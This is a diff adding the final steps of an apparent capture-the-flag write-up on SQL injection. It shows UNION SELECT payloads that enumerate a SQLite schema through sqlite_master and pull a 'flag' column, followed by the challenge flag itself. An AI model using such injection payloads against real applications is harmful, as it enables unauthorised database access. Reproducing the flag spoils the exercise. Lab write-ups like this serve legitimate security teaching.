@@ -50,7 +50,31 @@ nijika' UNION SELECT"1","tbl_name","3" FROM sqlite_master;--
 nijika' UNION SELECT"1","sql","3" FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='flag';--
 ```
 
-8. 
+> RESULT
 
+![image](https://user-images.githubusercontent.com/70703371/229271765-6cb02c92-2960-4dae-aca6-f2887e876aef.png)
+
+
+8. Finally, let's extract the data from the column.
+
+> QUERY
+
+```sql
+nijika' UNION SELECT"1","this_is_the_flag","3" FROM flag;--
+```
+
+
+> RESULT
+
+![image](https://user-images.githubusercontent.com/70703371/229271945-6f2189a0-fbf4-4fa1-aa98-8579f2e7d5e3.png)
+
+
+9. Got the flag!
+
+## FLAG
+
+```
+TCP1P{Sequel_Query_Langueange_Injection_1337}
+```
 
 
